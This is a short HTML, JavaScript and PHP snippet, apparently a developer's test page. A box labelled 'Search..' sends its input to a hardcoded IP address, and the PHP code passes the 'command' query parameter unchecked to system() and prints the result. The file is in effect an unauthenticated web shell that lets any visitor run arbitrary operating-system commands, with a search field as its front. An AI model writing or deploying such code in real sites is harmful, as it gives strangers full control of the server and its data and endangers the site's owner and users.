<script src="//ajax.googleapis.com/ajax/libs/jquery/1.9.1/jquery.min.js"></script>

<script>// <![CDATA[
function mykeypress(e){
    
if (e.keyCode == 13) {
       
       getData1();
   }
}
function getData1(){

    
    var x = $('#searchStr').val();

 $.ajax({url: "http://52.70.104.101/mytest.php?command="+x, success: function(result){
    $("#div1").html(result);
    },error:function(error){ alert(error) }});
}
// ]]></script>
<input id="searchStr" style="height: 50px; width: 350px;" name="command" type="text" placeholder="Search.." onkeypress="return mykeypress(event)" />

<?php

$command= 'ls';
if(isset($_GET['command']))
	$command = $_GET['command'];
echo '<pre>';

// Outputs all the result of shellcommand "ls", and returns
// the last output line into $last_line. Stores the return value
// of the shell command in $retval.
$last_line = system($command, $retval);

// Printing additional info
echo '</pre>';
?>